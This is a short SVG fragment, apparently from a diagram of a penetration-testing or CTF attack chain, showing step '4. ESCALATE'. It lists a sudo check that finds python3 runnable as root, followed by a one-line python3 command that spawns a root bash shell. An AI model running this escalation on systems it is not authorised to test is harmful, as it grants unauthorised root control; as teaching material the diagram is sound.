  <text x="115.000090625001" y="399.047467800477" font-size="22.187522155594" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">4. ESCALATE</text>
  <text x="115.000090625001" y="423.904768684806" font-size="18.774028127124" fill="var(--text)" font-family="Arial, sans-serif">sudo -l -&gt; Can run /usr/bin/python3 as root</text>
  <text x="115.000090625001" y="444.61900354876" font-size="18.774028127124" fill="var(--text)" font-family="Arial, sans-serif">sudo python3 -c 'import os; os.system("/bin/bash")' -&gt; ROOT!</text>
